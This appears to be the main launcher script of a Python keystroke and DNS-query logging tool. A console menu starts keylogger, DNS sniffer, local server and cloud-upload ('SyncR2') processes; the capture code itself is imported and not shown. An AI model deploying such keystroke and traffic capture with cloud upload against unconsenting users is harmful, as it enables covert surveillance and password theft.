from utilities import dir_path, sync, server, log_console
from logger import key_logger, dns_logger
import sys
import socket
import multiprocessing


def create_processes(choice):
    """Return a list of processes based on the user's menu choice."""
    proc = []
    if choice == 1:
        proc = [
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            
        ]
    elif choice == 2:
        proc = [
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
        ]
    elif choice == 3:
        proc = [
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"),
            
        ]
    elif choice == 4:
        proc = [
            multiprocessing.Process(target=key_logger, name="KeyLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
            
        ]
    elif choice == 5:
        proc = [
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
            multiprocessing.Process(target=sync, kwargs={"continuous": True}, name="SyncR2"), 
        ]
    elif choice == 6:
        proc = [
            multiprocessing.Process(target=dns_logger, name="DNSQueryLogger"),
            multiprocessing.Process(target=server, name="LocalServer"),
        ]
    return proc


def main():
    # Disallow multiple instances
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind(("", 9903))
    except socket.error:
        log_console("Multiple Instance not Allowed.", "ERROR")
        sys.exit()

    try:
        dir_path()
        log_console("Welcome", "INFO")
        log_console("Note: Npcap is required for Dns Logger on Windows. Get Npcap from https://npcap.com/#download.", "INFO")

        while True:
            try:
                service_choice = int(input(
                    "Choose what service you want.\n"
                    "1. Key and Dns Query logger with offline and cloud upload.\n"
                    "2. Key and Dns Query logger offline Only.\n"
                    "3. Key logger only with offline and cloud upload.\n"
                    "4. Key logger offline Only.\n"
                    "5. Dns Query logger offline and cloud upload.\n"
                    "6. Dns Query logger offline.\n"
                    "7. Exit\n"
                ))
            except ValueError:
                log_console("Invalid input! Please enter a number.", "WARNING")
                continue

            if service_choice == 7:
                log_console("Exiting...", "INFO")
                sys.exit(0)
            elif 1 <= service_choice <= 6:
                processes = create_processes(service_choice)
            else:
                log_console("Wrong Input! Try again.", "WARNING")
                continue

            # Show logger start message before starting processes
            log_console("Key/DNS Logger started.", "SUCCESS")

            # Start and join all selected processes with error handling
            try:
                for p in processes:
                    p.start()
                for p in processes:
                    p.join()
            except Exception as e:
                log_console(f"Error occurred while running processes: {e}", "ERROR")
                for p in processes:
                    if p.is_alive():
                        p.terminate()
                continue

    except KeyboardInterrupt:
        log_console("Interrupted by user. Exiting...", "INFO")
        sys.exit(0)
    except Exception as e:
        log_console(f"Unexpected error: {e}", "ERROR")
        sys.exit(1)


if __name__ == "__main__":
    multiprocessing.freeze_support()
    try:
        main()
    except KeyboardInterrupt:
        log_console("Interrupted by user. Exiting...", "INFO")
        sys.exit(0)
